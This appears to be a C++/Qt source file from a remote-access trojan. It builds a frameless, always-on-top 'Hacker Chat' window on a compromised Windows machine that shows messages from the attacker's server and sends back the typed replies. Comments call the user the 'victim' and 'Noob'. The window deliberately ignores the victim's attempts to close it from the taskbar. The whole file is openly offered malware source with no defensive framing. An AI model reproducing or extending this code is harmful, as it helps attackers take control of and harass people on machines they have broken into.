#include "chat.h"
#include "ui_chat.h"

chat::chat(QWidget *parent, tcpsocket *comSock) :
    QWidget(parent), communicationSocket(comSock),
    ui(new Ui::chat)
{
    //Setting up and showing the GUI
    this->setAttribute(Qt::WA_DeleteOnClose);
    ui->setupUi(this);
    this->setWindowTitle("Hacker Chat");
    this->setWindowFlags(Qt::FramelessWindowHint | Qt::SubWindow);
    this->show();

    SetWindowPos((HWND)this->winId(), HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
}

chat::~chat()
{
    //This window is never closed once created. It's only hidden.
    this->hide();
}

void chat::recievedCommand(QByteArray input)
{
    //if the server has sent the close command hide this window and return
    if(input == "close")
    {
      this->hide();
      return;
    }

    //else print the command in the window
    ui->textBrowser->setTextColor("red");
    ui->textBrowser->insertPlainText("Hacker: ");
    ui->textBrowser->moveCursor(QTextCursor::End);
    ui->textBrowser->setTextColor("black");
    ui->textBrowser->insertPlainText(QString(input) + "\n\n");
    ui->textBrowser->moveCursor(QTextCursor::End);

    this->activateWindow();
}

void chat::on_pushButton_clicked()
{
    //when the victim presses the reply button, print his reply in the window and send it to the server
    ui->textBrowser->setTextColor("green");
    ui->textBrowser->insertPlainText("Noob: ");
    ui->textBrowser->moveCursor(QTextCursor::End);
    ui->textBrowser->setTextColor("black");
    ui->textBrowser->insertPlainText(ui->lineEdit->text() + "\n\n");
    communicationSocket->sendReply(ui->lineEdit->text().toLocal8Bit());
    ui->lineEdit->clear();
}


//Ignore the close event when victim tries to close it from the taskbar
void chat::closeEvent(QCloseEvent *event)
{
    event->ignore();
}

void chat::on_lineEdit_returnPressed()
{
    on_pushButton_clicked();
}
